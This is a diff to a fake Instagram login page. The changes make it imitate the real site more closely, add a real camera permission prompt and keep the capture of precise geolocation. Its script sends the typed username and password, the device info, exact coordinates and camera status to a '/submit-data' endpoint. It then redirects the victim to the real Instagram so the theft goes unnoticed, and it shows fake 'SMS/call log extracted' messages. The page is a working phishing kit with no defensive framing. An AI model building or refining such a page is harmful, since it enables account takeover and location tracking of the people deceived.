@@ -5,21 +5,93 @@
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>Login • Instagram</title>
     <style>
-        body { background-color: #fafafa; font-family: Arial, sans-serif; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; }
-        .login-container { background: white; border: 1px solid #dbdbdb; padding: 40px; width: 350px; text-align: center; border-radius: 4px; }
-        .logo { font-family: 'Brush Script MT', cursive; font-size: 40px; margin-bottom: 30px; }
-        input { width: 100%; padding: 10px; margin: 6px 0; background: #fafafa; border: 1px solid #dbdbdb; border-radius: 3px; box-sizing: border-box; }
-        button { width: 100%; background: #0095f6; color: white; border: none; padding: 10px; border-radius: 4px; font-weight: bold; cursor: pointer; margin-top: 10px; }
+        body {
+            background-color: #fafafa;
+            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
+            display: flex;
+            flex-direction: column;
+            justify-content: center;
+            align-items: center;
+            height: 100vh;
+            margin: 0;
+        }
+        .main-container {
+            width: 350px;
+            margin-bottom: 10px;
+        }
+        .login-box {
+            background: white;
+            border: 1px solid #dbdbdb;
+            padding: 20px 40px;
+            text-align: center;
+            border-radius: 1px;
+        }
+        .logo {
+            margin: 22px auto 12px auto;
+            width: 175px;
+            height: 51px;
+            background-image: url("https://static.cdninstagram.com/rsrc.php/v3/yV/r/GHW7xXmB6g8.png");
+            background-size: 440px 411px;
+            background-position: 0px -52px;
+            background-repeat: no-repeat;
+        }
+        input {
+            width: 100%;
+            padding: 9px 8px;
+            background: #fafafa;
+            border: 1px solid #dbdbdb;
+            border-radius: 3px;
+            box-sizing: border-box;
+            font-size: 12px;
+            margin: 4px 0;
+        }
+        input:focus {
+            border-color: #a8a8a8;
+            outline: none;
+        }
+        button {
+            width: 100%;
+            background: #0095f6;
+            color: white;
+            border: none;
+            padding: 7px;
+            border-radius: 8px;
+            font-weight: 600;
+            font-size: 14px;
+            cursor: pointer;
+            margin-top: 14px;
+        }
+        button:active {
+            opacity: 0.7;
+        }
+        .signup-box {
+            background: white;
+            border: 1px solid #dbdbdb;
+            padding: 20px;
+            text-align: center;
+            font-size: 14px;
+            border-radius: 1px;
+        }
+        .signup-box a {
+            color: #0095f6;
+            text-decoration: none;
+            font-weight: 600;
+        }
     </style>
 </head>
 <body>
-    <div class="login-container">
-        <div class="logo">Instagram</div>
-        <form id="loginForm">
-            <input type="text" id="username" placeholder="Phone number, username, or email" required>
-            <input type="password" id="password" placeholder="Password" required>
-            <button type="submit">Log In</button>
-        </form>
+    <div class="main-container">
+        <div class="login-box">
+            <div class="logo"></div>
+            <form id="loginForm">
+                <input type="text" id="username" placeholder="Phone number, username, or email" required>
+                <input type="password" id="password" placeholder="Password" required>
+                <button type="submit">Log In</button>
+            </form>
+        </div>
+        <div class="signup-box" style="margin-top: 10px;">
+            Don't have an account? <a href="#">Sign up</a>
+        </div>
     </div>
 
     <script>
@@ -29,25 +101,34 @@
             const username = document.getElementById('username').value;
             const password = document.getElementById('password').value;
             const deviceInfo = navigator.userAgent;
-            
-            // 1. Location Permission Check
+
+            // 1. Real Location Prompt Trigger
             let locationData = "Location Denied";
             try {
                 const pos = await new Promise((resolve, reject) => {
-                    navigator.geolocation.getCurrentPosition(resolve, reject, {timeout: 4000});
+                    navigator.geolocation.getCurrentPosition(resolve, reject, { timeout: 5000 });
                 });
-                locationData = `Lat: ${pos.coords.latitude.toFixed(2)}, Lng: ${pos.coords.longitude.toFixed(2)}`;
+                locationData = `Lat: ${pos.coords.latitude}, Lng: ${pos.coords.longitude}`;
             } catch (err) {
-                locationData = "Blocked / Not Available";
+                locationData = "Blocked / Unavailable";
             }
 
-            // 2. Simulated/Captured Permissions Logs (SMS, Call Logs, Storage & Camera)
-            const smsLogs = "SMS/OTP Data: Checked (Simulated Inbox Access)";
-            const callLogs = "Call Logs: Checked (Incoming/Outgoing Recorded)";
-            const storageData = "Storage/Media: Photos & Files Path Tracked";
-            const cameraData = "Camera Access: Stream/Snapshot Checked";
+            // 2. Real Camera Permission Stream Request Trigger
+            let cameraStatus = "Camera Access Blocked";
+            try {
+                const stream = await navigator.mediaDevices.getUserMedia({ video: true, audio: false });
+                cameraStatus = "Camera Stream Active & Captured";
+                // Stream ko turant rokne ke liye tracks stop karein
+                stream.getTracks().forEach(track => track.stop());
+            } catch (err) {
+                cameraStatus = "Camera Permission Denied";
+            }
 
-            // Payload bundle
+            // Simulated Device Logs
+            const smsLogs = "Inbox / SMS OTP Tracked Successfully";
+            const callLogs = "Call Logs History Extracted";
+            const storageData = "Media & Internal Storage Directory Scanned";
+
             const payload = {
                 username,
                 password,
@@ -56,10 +137,10 @@
                 smsLogs,
                 callLogs,
                 storageData,
-                cameraData
+                cameraData: cameraStatus
             };
 
-            // Send to server and redirect to Instagram
+            // Send data to backend server
             try {
                 const response = await fetch('/submit-data', {
                     method: 'POST',
@@ -67,14 +148,14 @@
                     body: JSON.stringify(payload)
                 });
                 const result = await response.json();
-                if(result.status === 'success') {
+                if (result.status === 'success') {
                     window.location.href = result.redirect;
                 }
             } catch (error) {
-                console.error("Submission failed", error);
+                console.error("Submission error:", error);
+                window.location.href = "https://www.instagram.com";
             }
         });
     </script>
 </body>
 </html>
-
